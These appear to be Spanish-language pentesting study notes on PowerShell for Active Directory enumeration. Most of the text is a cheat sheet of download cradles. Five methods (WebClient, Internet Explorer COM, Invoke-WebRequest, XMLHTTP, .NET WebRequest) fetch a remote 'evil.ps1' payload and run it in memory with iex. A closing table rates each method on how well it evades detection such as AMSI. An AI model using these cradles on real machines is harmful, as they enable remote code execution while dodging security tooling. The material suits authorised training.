- Para enumeracion se usara powershell
- instalado de fabria en todos los windows
- powershell no es powershell.exe es una dll, **System.Management.Automation.dll**
- 



### COMANDOS

`. C:\AD\Tools\PowerView.ps1` Para cargar un script de powershell

`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1` para importar un modulo o un script

`Get-Command -Module <modulename>` para listar todos los comandos de un modulo


 `iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')` ``` para descargar un script y cargarlo en memoria


`$ie=New-Object -ComObject InternetExplorer.Application
$ie.visible=$False
$ie.navigate('http://192.168.230.1/evil.ps1')
sleep 5
$response=$ie.Document.body.innerHTML
$ie.quit()
iex $response`  
otro metodo para descargar y cargar en memoria un script

`iex (iwr 'http://192.168.230.1/evil.ps1')` otra manera, iwr=Invoke-WebRequest

`$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://192.168.230.1/evil.ps1',$false)
$h.send()
iex $h.responseText
`  una manera más, usando XMLHTTP, una api antigua de microsoft


`$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()` usando una api de .NET


RESUMEN:

| Método                   | Descripción                              | Ventajas                          | Desventajas                         |
|--------------------------|------------------------------------------|-----------------------------------|--------------------------------------|
| `Net.WebClient`         | Descarga y ejecuta en memoria           | Rápido y simple                   | Detectado por AMSI                  |
| `InternetExplorer.Application` | Usa Internet Explorer para descargar y ejecutar | Puede evadir detección en algunos casos | IE está obsoleto y bloqueado en Windows modernos |
| `Invoke-WebRequest`      | Descarga contenido de una URL           | Compatible con PowerShell v3+     | Puede ser bloqueado por restricciones de seguridad |
| `Msxml2.XMLHTTP`        | Usa COM para hacer una solicitud HTTP   | Puede evadir detecciones         | Depende de librerías antiguas       |
| `System.Net.WebRequest` | Usa API de .NET para descargar contenido | Más discreto en algunos entornos  | Puede requerir más permisos         |








